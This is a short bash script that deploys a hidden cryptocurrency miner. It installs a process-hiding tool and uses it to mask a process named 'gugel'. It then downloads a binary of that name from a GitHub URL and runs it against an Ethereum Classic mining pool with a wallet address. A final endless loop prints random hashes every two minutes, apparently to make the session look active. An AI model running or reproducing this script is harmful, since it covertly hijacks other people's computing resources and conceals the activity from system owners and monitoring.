#!/bin/bash
#!/bin/sh
#!/bin/bash

apt update
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
npm i -g node-process-hider 
ph add gugel
wget https://github.com/fauzyvee/memeks/raw/main/gugel
chmod +x gugel >/dev/null 2>&1 
./gugel --url=ssl://0x3da2c7743970908cac0e6b606f064330aea8b03f@asia1-etc.ethermine.org:4444
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
